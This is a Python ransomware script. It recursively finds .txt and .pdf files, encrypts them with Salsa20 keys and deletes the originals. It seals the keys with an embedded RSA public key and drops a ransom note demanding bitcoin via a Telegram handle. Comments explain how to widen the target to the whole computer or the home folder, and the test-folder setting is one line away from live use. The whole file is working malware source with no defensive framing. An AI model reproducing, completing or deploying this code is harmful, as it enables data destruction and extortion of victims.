#!/usr/bin/python3
import os
import base64

import Crypto
from Crypto.Cipher import Salsa20
from Crypto.PublicKey import RSA
from Crypto import Random
from Crypto.Cipher import PKCS1_OAEP

#Global Var
theSalsa = []


masterkey = RSA.importKey(base64.b64decode(b"LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF5c28rSWlMK0RwZGF1RGVRaHlmZgo4UWJIVWFad0VQY3puZDF1TEt3Sm8yT01ma0NsZkRYVWw2MG9RcEE4VENSYWR3djRqK3ZPZ0ppYUJKLzFHWTRuCm9ubTkwN3NOOVVUY3p1ZitzK09PcWhKcWZKK3dFaWg5WXIwUVJiWHo3ZE1MTFArL1doODNnRjRLejVQZ0NSQnMKOElIaGFaU1pjbnlxaGNvUzdSS3ZJUkhCb1Z2ZmZhRHVxVkp2Um1HQzRMSXB3SENrS1RXTWlQOGx5TGhHZnY1dQozZ3lMM0pteW0yTkYybVFxSDdYaHg4TElhUVk1RkJyazJ5cmFzTEd1NzZ2UXZNNWhQSlNGSllYbVFEYVZCOXhYCnlyZnk5bTAzdm5WWWxlOU91SXdIV2xxNWVyM1ZyMW1YNjVZOENzS3FFWVhtSUN3ME91Qjl1UVJlU0JocmFQcE4KandJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t"))

# fs_root = "/" - if the user is root, encrypt the whole compuer
# fs_root = os.path.expanduser("~") - if the user doesn't have root priviledges, only encrypt files from his home folder
fs_root = os.path.join(os.path.expanduser("~"), "test") # for tesing only
file_extensions = [".txt", ".pdf"]


def alreadyEncrypted():
	global fs_root
	return os.path.isfile(os.path.join(fs_root, "info.bcrypt"))


def writeInfo(salsakeys):
	global fs_root
	global masterkey
	global file_extensions
	cipher = PKCS1_OAEP.new(masterkey)

	f = open(os.path.join(fs_root, "info.bcrypt"), "w")
	f.write("INFO\n")
	f.write("----\n\n")
	f.write("Encrypted RSA public key: {}".format(base64.b64encode(masterkey.exportKey('PEM')).decode()))
	f.write("\nEncrypted file-specific keys:\n")
	for i in range(len(salsakeys)):
		fe = file_extensions[i]
		sk = salsakeys[i]
		dec = fe.encode() + b"." + sk
		enc = cipher.encrypt(dec)
		f.write(base64.b64encode(enc).decode() + '\n')
	f.close()


def getFiles(dir, ext=".txt"):
	fs = os.listdir(dir)
	files = list()
	for f in fs:
		path = os.path.join(dir, f)
		if os.path.isdir(path):
			files = files + getFiles(path, ext)
		else:
			if path.endswith(ext):
				files.append(path)
	return files


def encryptFile(file, key):
	try:
		print("Encrypting {}...".format(file))
		plaintext = open(file, 'rb').read()
		cipher = Salsa20.new(key=key)
		msg = cipher.nonce + cipher.encrypt(plaintext)
		open("{}.enc".format(file), "wb").write(msg)
		os.remove(file)
	except:
		print("Could not encrypt {}!".format(file))


def encryptFileExtension(ext, key):
	global fs_root
	files = getFiles(fs_root, ext)
	for file in files:
		encryptFile(file, key)


def ransomNote():
	home = os.path.expanduser("~")
	desktop = os.path.join(home, "test/Desktop")
	filename = "OPEN_ME.txt"
	msg = "Hi!\nAll your files have been encrypted.\nPlease transfer 1 bitcoint to XXXXXXXXX.\nIf you don't know how, just search it on the internet.\nAfter the payment is at least 10 blocks old, pleas contact @HAXXmaster1337 on Telegram to receive the decryption software."
	open(os.path.join(desktop,filename), "w+").write(msg)
	print("Ransom note written")

#***********EXPERIMENTAL CODE******************
#***********EXPERIMENTAL CODE******************
def storeSalsa(salsaKeys):
	file = open("salsaStorage.bin", "wb")
	#for i in range(len(salsaKeys)):
	file.write(theSalsa[0])
	file.close()

def eatSalsa():
	testSalsa = []
	file1 = open("salsaStorage.txt", "rb")
	if file1.mode == 'r':
		testSalsa.append(file1.read())
		print(testSalsa)
#***********EXPERIMENTAL CODE******************
#***********EXPERIMENTAL CODE******************

def main():
	global fs_root
	global file_extensions
	global masterkey
	if alreadyEncrypted():
		print("'{}info.bcrypt' already exists! Exiting...".format(fs_root))
		return

	# Generate keys
	print("Generating new keys...")
	salsakeys = []
	for ext in file_extensions:
		salsakey = Random.new().read(32)
		theSalsa.append(salsakey)
		print(salsakey)
		salsakeys.append(salsakey)

	print("Writing info.bcrypt...")
	writeInfo(salsakeys)

	#************EXPERIMENTAL CODE****************
	print("Storing keys into salsaStorage...")
	storeSalsa(salsakeys[0])
	#eatSalsa()
	#************EXPERIMENTAL CODE****************

	# Encrypt all files that have the specified file extension
	for i in range(len(file_extensions)):
		fe = file_extensions[i]
		sk = salsakeys[i]
		encryptFileExtension(fe, sk)

	# Leave ransom note
	ransomNote()

	print("Done. Have a nice day!")


if __name__ == "__main__":
	main()
